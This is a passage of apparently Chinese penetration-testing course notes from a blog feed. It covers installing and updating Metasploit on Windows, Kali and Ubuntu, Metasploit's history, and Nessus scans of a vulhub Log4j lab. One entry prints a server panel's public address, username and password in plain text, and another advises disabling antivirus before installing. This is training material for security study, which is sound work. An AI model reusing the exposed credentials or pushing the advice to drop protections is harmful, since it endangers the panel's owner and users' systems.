href="https://git.sdut.me/">https://git.sdut.me/</a></p><p><a href="http://github-mirror.bugkiller.org/">http://github-mirror.bugkiller.org/</a><br>#api镜像<br><a href="https://api.git.sdut.me/">https://api.git.sdut.me/</a></p><p>然后找到Windows版本的下载</p><p>点击 latest Windows installer 下载  最新版本</p><p>点击  view older builds   下载历史版本</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970354000/cd3b851b93854b55b549028fa9fb61f9.png" alt="image.png"></p><h1 id="2-安装metasploit并配置环境变量"><a href="#2-安装metasploit并配置环境变量" class="headerlink" title="2 安装metasploit并配置环境变量"></a>2 安装metasploit并配置环境变量</h1><p>安装前关闭win自带的杀毒 和卸载第三方杀毒</p><p>添加环境变量</p><p>C:\metasploit-framework\bin</p><h1 id="3-启动并使用"><a href="#3-启动并使用" class="headerlink" title="3 启动并使用"></a>3 启动并使用</h1><p>首次启动 需要初始化数据库</p><p>终端中输入 msfdb init</p><p>启动MSF框架</p><p>终端中输入 msfconsole</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/03-kali-geng-xin-msf/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/03-kali-geng-xin-msf/</url>
      
        <content type="html"><![CDATA[<p>登录kali</p><h1 id="1-打开终端获取root权限"><a href="#1-打开终端获取root权限" class="headerlink" title="1 打开终端获取root权限"></a>1 打开终端获取root权限</h1><pre class="line-numbers language-none"><code class="language-none">获取root权限 可以在终端 输入 sudo su  然后输入登录密码获取root权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="2-开始更新"><a href="#2-开始更新" class="headerlink" title="2 开始更新"></a>2 开始更新</h1><h2 id="换国内源"><a href="#换国内源" class="headerlink" title="换国内源"></a>换国内源</h2><p>首先先添加更新源</p><p>进入 etc/apt/   目录</p><p>打开 sources.list   需要使用root权限执行</p><p><code>vim /etc/apt/sources.list</code></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970340000/777269e6dc9143718ac9080d4650d0c7.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">#中科大源deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib #阿里云kali更新源deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#清华大学源deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free#浙大源deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-freedeb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free#东软大学源deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contribdeb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib#网易Kali源 deb http://mirrors.163.com/debian wheezy main non-free contrib deb-src http://mirrors.163.com/debian wheezy main non-free contrib deb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​     </p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970340000/c9eeca42087541a09f20a8078d8064c7.png" alt="image.png"></p><h2 id="更新软件列表"><a href="#更新软件列表" class="headerlink" title="更新软件列表"></a>更新软件列表</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> update  <span class="token comment">#更新软件列表</span><span class="token function">apt-get</span> upgrade  <span class="token comment">#更新软件</span><span class="token function">apt-get</span> dist-upgrade  <span class="token comment">#升级</span><span class="token function">apt-get</span> clean  <span class="token comment">#删除缓存包</span><span class="token function">apt-get</span> autoclean  <span class="token comment">#删除未安装的deb包</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="更新metasploit"><a href="#更新metasploit" class="headerlink" title="更新metasploit"></a>更新metasploit</h2><p><code>apt-get install metasploit-framework</code></p><h1 id="3-如果更新时显示update无效的错误！"><a href="#3-如果更新时显示update无效的错误！" class="headerlink" title="3 如果更新时显示update无效的错误！"></a>3 如果更新时显示update无效的错误！</h1><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970340000/dea81b359ad14271b35fbc7db0609126.png" alt="image.png"></p><p>输入下面几个命令修复</p><pre class="line-numbers language-none"><code class="language-none">wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add apt-get clean apt-get update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>4 如果报：E: Unmet dependencies. Try ‘apt –fix-broken install’ with no packages (or specify a solution).</p><p><code>apt --fix-broken install</code>             </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/02-linux-an-zhuang-msf/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/02-linux-an-zhuang-msf/</url>
      
        <content type="html"><![CDATA[<p><strong>1 乌班图安装MSF</strong></p><p><strong>环境准备：</strong></p><p>vm虚拟机 </p><p>Ubuntu桌面版镜像 </p><p>打开终端  输入 sudo su  获取root权限 </p><p>然后输入命令</p><pre class="line-numbers language-none"><code class="language-none">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后赋755权限 并执行安装</p><pre class="line-numbers language-none"><code class="language-none">chmod 755 msfinstall &amp;&amp; ./msfinstall<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2 直接安装kali系统</strong></p><p>第一种vm虚拟机 kali </p><p>第二种 iso安装镜像</p><p>首先咱们进入kali官网下载kali</p><p><a href="https://www.kali.org/get-kali/#kali-bare-metal">https://www.kali.org/get-kali/#kali-bare-metal</a>  选择安装版镜像</p><p>![1639993881805](02 Linux安装msf.assets/1639993881805.png)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/01-msf-fa-zhan-shi/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/25msf-cobalt-strike/01-msf-fa-zhan-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Metasploit-发展史"><a href="#1-Metasploit-发展史" class="headerlink" title="1 Metasploit-发展史"></a>1 Metasploit-发展史</h1><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639966573000/418450a2cc3143c2bb296f73eccb131d.png" alt="image.png"></p><p>Metasploit框架使Metasploit具有良好的可扩展性，它的控制接口负责发现漏洞、攻击漏洞，提交漏洞，然后通过一些接口加入攻击后处理工具和报表工具。Metasploit框架可以从一个漏洞扫描程序导入数据，使用关于有漏洞主机的详细信息来发现可攻击漏洞，然后使用有效载荷对系统发起攻击，有效载荷就是在发现漏洞之后开发一种可行的攻击方法。其用于提取本地系统密码、安装其他软件或控制硬件等的模块，这些功能很像以前BO2K等工具所具备的功能。</p><h2 id="2004年"><a href="#2004年" class="headerlink" title="2004年"></a>2004年</h2><p>2004年8月，在拉斯维加斯开了一次世界黑客交流会–叫黑帽简报（Black Hat Briefings). 在这个会议上，一款叫Metasploit 的攻击和渗透工具备受众黑客关注，出尽了风头。 Metasploit 是同 HD Moore 和 Spoonm等4名年轻人开发的，这款免费软件可以帮助黑客攻击和控制计算机，安全人员也可以利用 Metasploit 来加强系统对此类工具的攻击。Metasploit 的演示吸引了来自“美国国防部”和“国家安全局”等政府机构的众多安全顾问和个人，正如 Spoonm 在演讲中所说的, Metasploit 很简单，只需要求“找到目标，单击和控制”即可。 2004年 Metasploit 的发布在安全界引发了强烈的“地震”。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639966573000/a3d942aff8ef42949af2523afdc7fb00.png" alt="image.png"></p><h2 id="2005年"><a href="#2005年" class="headerlink" title="2005年"></a>2005年</h2><p>2005年6月，西雅图效区的微软公司总部园区内的管理情报中心，开了一次“蓝帽”会议。几百名微软公司的工程师和众多外界专家及黑客都被邀请进入微软帝国的中心。在会议中的黑客攻击演示中，当 Moore 向系统程序员们说明使用 Metasploit 测试系统对抗入侵的可靠程度时，Metasploit 让微软公司的开发人员再次感到不安。在程序员们看来，Metasploit 将会使系统安全面临严重的考验。 Metasploit (MSF) 在2003年以开放源码方式发布，是可以自由获取的开发框架。它是一个强大的开源平台，提供开发，测试和使用恶意代码，这个环境为渗透测试，为shellcode 编写和漏洞研究提供了一个可靠平台。 Metasploit框架直到2006年发布的2.7版本都用Perl脚本语言编写，由于Perl的一些缺陷，开发者于2007年底使用Ruby语言重写了该框架。到2007年年底，Spoonm和马特·米勒已经离开了项目。从2008年发布的3.2版本开始，该项目采用新的3段式BSD许可证。</p><h2 id="2009年"><a href="#2009年" class="headerlink" title="2009年"></a>2009年</h2><p>2009年10月21号，漏洞管理解决公司Rapid7收购Metasploit项目。Rapid7承诺成立专职开发团队，仍然将源代码置于3段式BSD许可证下。</p><h1 id="2-BSD许可证"><a href="#2-BSD许可证" class="headerlink" title="2 BSD许可证"></a>2 BSD许可证</h1><p>相较于GPL许可证和MPL许可证的严格性，BSD许可证就宽松许多了，一样是只需要附上许可证的原文，不过比较有趣的是，它还要求所有进一步开发者将自己的版权资料放上去，所以拿到以BSD许可证发行的软件可能会遇到一个小状况，就是这些版权资料许可证占的空间比程序还大。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639966573000/9bc54e5da27644769e8c59836a95aa0c.png" alt="image.png"></p><h1 id="3-Metasploit发展前景"><a href="#3-Metasploit发展前景" class="headerlink" title="3 Metasploit发展前景"></a>3 Metasploit发展前景</h1><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639966573000/53ecab99591140878359777a3039a423.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/24nessus-lou-dong-sao-miao/di-5-jie-nessus-sao-miao-log4j-lou-dong/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/24nessus-lou-dong-sao-miao/di-5-jie-nessus-sao-miao-log4j-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Nessus-扫描log4J漏洞"><a href="#Nessus-扫描log4J漏洞" class="headerlink" title="Nessus 扫描log4J漏洞"></a>Nessus 扫描log4J漏洞</h1><h2 id="1-扫描环境搭建"><a href="#1-扫描环境搭建" class="headerlink" title="1.扫描环境搭建"></a>1.扫描环境搭建</h2><h5 id="1-centos7-安装装宝塔面板"><a href="#1-centos7-安装装宝塔面板" class="headerlink" title="1.centos7 安装装宝塔面板"></a>1.centos7 安装装宝塔面板</h5><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/0441e1bbb16a4097a848d126df6ad17a.png" alt="image.png"></p><p><img src="/assets/image-20221211213741692.png" alt="image-20221211213741692"></p><pre class="line-numbers language-none"><code class="language-none">外网面板地址: http://61.157.69.124:8888/3bcd8840内网面板地址: http://192.168.70.10:8888/3bcd8840username: lo3xkp7ipassword: 0f947aea<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="2-面板里下载docker"><a href="#2-面板里下载docker" class="headerlink" title="2.面板里下载docker"></a>2.面板里下载docker</h5><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/de849a33389c490bb17d0eac6a96fecb.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/519f4443f1814959b11df6d88aac4145.png" alt="image.png"></p><h5 id="3-进入centos检查docker是否生效"><a href="#3-进入centos检查docker是否生效" class="headerlink" title="3.进入centos检查docker是否生效"></a>3.进入centos检查docker是否生效</h5><pre class="line-numbers language-none"><code class="language-none">docker --version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="4-安装docker-compose"><a href="#4-安装docker-compose" class="headerlink" title="4.安装docker-compose"></a>4.安装docker-compose</h5><p>Docker Compose是一个用来定义和运行复杂应用的Docker工具。一个使用Docker容器的应用，通常由多个容器组成。使用Docker Compose不再需要使用shell脚本来启动容器。</p><p>Compose 通过一个配置文件来管理多个Docker容器，在配置文件中，所有的容器通过services来定义，然后使用docker-compose脚本来启动，停止和重启应用，和应用中的服务以及所有依赖服务的容器，非常适合组合使用多个容器进行开发的场景。</p><p>参考：<a href="https://docs.docker.com/compose/install/">https://docs.docker.com/compose/install/</a></p><p>4.1 下载 docker-compose</p><pre class="line-numbers language-none"><code class="language-none">curl -L "https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/021b03ca8c80487f9195adc1109febbd.png" alt="image.png"></p><p>4.2 查看docker-compose</p><pre class="line-numbers language-none"><code class="language-none">ls /usr/local/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/07d926dcfd0d42d99b24743b674def58.png" alt="image.png"></p><p>4.3 给docker-compose目录增加可执行权限</p><pre class="line-numbers language-none"><code class="language-none">chmod +x /usr/local/bin/docker-composels /usr/local/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/1a52eca9ba98451e9944261df831b9e1.png" alt="image.png"></p><p>4.4 查看版本</p><pre class="line-numbers language-none"><code class="language-none">docker-compose -version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/2e178bf8083d40e8a8a2a4626dce321a.png" alt="image.png"></p><h5 id="5-安装vulhub"><a href="#5-安装vulhub" class="headerlink" title="5.安装vulhub"></a>5.安装vulhub</h5><p>5.1 创建zsoft文件夹</p><pre class="line-numbers language-none"><code class="language-none">cd /www/wwwroot/lsmkdir softslscd softs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/100e72d253494a77865a0ef28e3853e0.png" alt="image.png"></p><p>5.2 下载 vulhub,并查看</p><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/vulhub/vulhub.gitlscd vulhubls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/f07e9e024a4845c3b9b041e2e551536d.png" alt="image.png"></p><h5 id="6-部署log4J靶场"><a href="#6-部署log4J靶场" class="headerlink" title="6.部署log4J靶场"></a>6.部署log4J靶场</h5><p>6.1 进入log4j/CVE-2021-44228</p><pre class="line-numbers language-none"><code class="language-none">cd log4j/CVE-2021-44228ls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/dac22ab5392b42ceb89fdb2d04f1f6cf.png" alt="image.png"></p><p>6.2 编译环境</p><pre class="line-numbers language-none"><code class="language-none">docker-compose build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/8826d479399247d19cac4368b5584a13.png" alt="image.png"></p><p>6.3 运行环境</p><pre class="line-numbers language-none"><code class="language-none">docker-compose up -ddocker-compose down //关闭环境<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>6.4 查看端口</p><pre class="line-numbers language-none"><code class="language-none">docker-compose psdocker ps<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/99dbccec16e8460cb65771e03b010197.png" alt="image.png"></p><p>6.5 查看ip</p><pre class="line-numbers language-none"><code class="language-none">ip a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/b864d9f810564857a93c5eb342240344.png" alt="image.png"></p><p>6.6 宝塔面板放行端口</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/5398f901945340fb9f0531283655dd15.png" alt="image.png"></p><p>6.7 访问靶场地址</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.70.10:8983<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/f19a24723ea74f90bfbd516c97ac17fc.png" alt="image.png"></p><h2 id="2-扫描log4J漏洞"><a href="#2-扫描log4J漏洞" class="headerlink" title="2.扫描log4J漏洞"></a>2.扫描log4J漏洞</h2><h3 id="1-log4Jshell扫描"><a href="#1-log4Jshell扫描" class="headerlink" title="1.log4Jshell扫描"></a>1.log4Jshell扫描</h3><p>1.访问nessus扫描网站</p><pre class="line-numbers language-none"><code class="language-none">https://192.168.70.3:8834/#/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/5312ef585b90494393ac1c3836733512.png" alt="image.png"></p><p>2.登录后，点击【新增扫描】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/d7b219844c3d4be4a870a9172bd1a0c8.png" alt="image.png"></p><p>3.选择【Log4Shell】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/879dab939e1948fe88055cce194c4472.png" alt="image.png"></p><p>4.输入Name【log4jshell】，目标【192.168.110.198】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/2c9bafcb837e4b10acdfe1796110af16.png" alt="image.png"></p><p>5.点击【发现】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/54e3442117ad4a51808430dcd3d9004a.png" alt="image.png"></p><p>6.选择扫描类型【彻底】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/27cc3ab79bf54b9da3af319a2d8ed9ff.png" alt="image.png"></p><p>7.点击【评估】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/249465aabe16419b9480bc51108f7922.png" alt="image.png"></p><p>8.选择扫描类型【默认】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/1be69e69dc224a41bab404c4918e0e4f.png" alt="image.png"></p><p>9.点击【证书】,点击【ssh】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/e39419bb80074bfc9a6f0173912c924d.png" alt="image.png"></p><p>10.选择身份验证方法【密码】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/ae7649df348d424397281fcfb273e6d0.png" alt="image.png"></p><p>11.输入被扫描服务器的用户名【root】，密码【root】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/20a706aa71c149f988c2bd3a0a8c91d1.png" alt="image.png"></p><p>12.点击【插件】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/d55fa35e69ea42768a03f1513c35f1ef.png" alt="image.png"></p><p>13.点击【保存】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/f9ea1593922343a58b2ce767e674cdf0.png" alt="image.png"></p><p>14.执行【log4shell】扫描</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/d7721cd40f2d4817b55c50dccb64b0b5.png" alt="image.png"></p><p>15.查看log4J的扫描结果</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/366adf34bbb8440ba60b270fdcf51d87.png" alt="image.png"></p><h3 id="2-nesuss扫描Log4Shell-漏洞生态系统"><a href="#2-nesuss扫描Log4Shell-漏洞生态系统" class="headerlink" title="2.nesuss扫描Log4Shell 漏洞生态系统"></a>2.nesuss扫描Log4Shell 漏洞生态系统</h3><p>1.访问nessus扫描网站</p><p><a href="https://192.168.70.3:8834/#/">https://192.168.70.3:8834/#/</a></p><p>2.点击新建扫描</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/3e85bf0e4380479b8df37afeb85973e5.png" alt="image.png"></p><p>3.选择【Log4Shell 漏洞生态系统】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/24fc6288d71340efae4d97bd5ad9f870.png" alt="image.png"></p><p>4.输入Name【log4jshell 生态】，目标【192.168.110.198】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/5fe55d20097c458db27204caad1b22af.png" alt="image.png"></p><p>5.点击【发现】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/5b8e5e6b086742fe85a816475ef782bc.png" alt="image.png"></p><p>6.选择扫描类型【彻底】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/525da2c8e3684e69a3e7ebde40302d61.png" alt="image.png"></p><p>7.点击【评估】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/99012fc379dd4e27aec5c0a4e3f2c1f8.png" alt="image.png"></p><p>8.选择扫描类型【默认】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/4ea0cce3414643abb0cce510e0b882b4.png" alt="image.png"></p><p>9.点击【证书】,点击【ssh】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/7c20e6d3e7824e95ba02c85bc7722628.png" alt="image.png"></p><p>10.点击【插件】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/741be19fc5044b4c84da53ecdf6bab9f.png" alt="image.png"></p><p>11.点击【保存】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/5e45a982324f4b14a7c17e016f0c5b9f.png" alt="image.png"></p><p>12.执行【log4shell 生态】扫描</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/fc08c461762b4f96aa936946747c4e05.png" alt="image.png"></p><p>13.查看log4J 生态的扫描结果</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/3192b68ad96e4e9aaaff70e36b057477.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/24nessus-lou-dong-sao-miao/di-4-jie-nessus-sao-miao-web-fu-wu/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/24nessus-lou-dong-sao-miao/di-4-jie-nessus-sao-miao-web-fu-wu/</url>
      
        <content type="html"><![CDATA[<h1 id="Nessus-扫描web服务"><a href="#Nessus-扫描web服务" class="headerlink" title="Nessus 扫描web服务"></a>Nessus 扫描web服务</h1><p>1.启动nessus</p><pre class="line-numbers language-none"><code class="language-none">cd nessussh qd_nessus.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2.进入nessus网站</p><pre class="line-numbers language-none"><code class="language-none">https://192.168.3.47:8834/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.点击【New Scan】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/55304735fe8946f6a0ced005bc35c64a.png" alt="image.png"></p><p>4.点击【Web应用程序测试】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/e9d95f4061d6499c823cb51e7879ebe6.png" alt="image.png"></p><p>5.输入name【web扫描】，描述【web扫描】，目标【127.0.0.1】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/50c7f3ab84c44ee0b6fe81e3b8a30f4c.png" alt="image.png"></p><p>6.点击【发现】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/49f9bad581cb40dea6ed3abae5c95cd5.png" alt="image.png"></p><p>7.选择扫描类型【端口扫描(常用端口)】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/c1e34fee97b0485dad86f8df929e5430.png" alt="image.png"></p><p>8.点击【评估】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/4ea7b2375b8c41349514308597c351e2.png" alt="image.png"></p><p>9.扫描类型选择【扫描所有web漏洞(快速)】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/9f4dc31931d04fccae316141d8bc6c3f.png" alt="image.png"></p><p>10.点击【证书】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/a7c908efe8444f4eae6a37a90c7fa3dd.png" alt="image.png"></p><p>11.点击【HTTP】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/a83dc3e5b4814ce3b38c45e0b8d68379.png" alt="image.png"></p><p>12.选择身份验证方法【自动认证】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/bf47d655d7754bf0867b0b8b3a12e173.png" alt="image.png"></p><p>13.输入用户名【xiaogang】，密码【123456】（需要扫描网站的用户名和密码）</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/dc040e35f171464482f0922aa58491ff.png" alt="image.png"></p><p>14.点击【插件】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/c36226d195f94681bd294fc12f13eece.png" alt="image.png"></p><p>15.确认是否在可用的扫描插件</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/ed665f405a0547ec9f301ec455040870.png" alt="image.png"></p><p>16.点击【保存】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/4a820525dba34f2ca51513670b0fc63e.png" alt="image.png"></p><p>17.选择【web扫描】，点击后边的【小三角】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/3e5fbe3b52504eefae3df12b42e4561f.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/064b9a7184534364a04215d195b1c29b.png" alt="image.png"></p><p>18.点击【web扫描】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/52b4c83c31d34caf87530813de3952cd.png" alt="image.png"></p><p>19.等待扫描完成</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/c98d001614bb4fa9b675d16ed08b4885.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/1ecb527fb62442d8bc7f3f66cf2ca4d6.png" 